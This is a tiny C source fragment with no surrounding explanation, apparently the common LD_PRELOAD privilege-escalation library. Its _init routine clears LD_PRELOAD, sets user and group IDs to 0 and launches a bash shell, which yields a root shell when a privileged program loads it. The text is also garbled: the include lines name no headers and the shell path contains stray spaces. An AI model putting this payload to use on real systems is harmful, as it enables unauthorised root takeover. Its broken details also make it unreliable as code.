#include
#include
#include
void _init () {
 unsetenv ("LD_PRELOAD");
 setgid (0);
 setuid (0);
 system ("/ bin / bash");
}
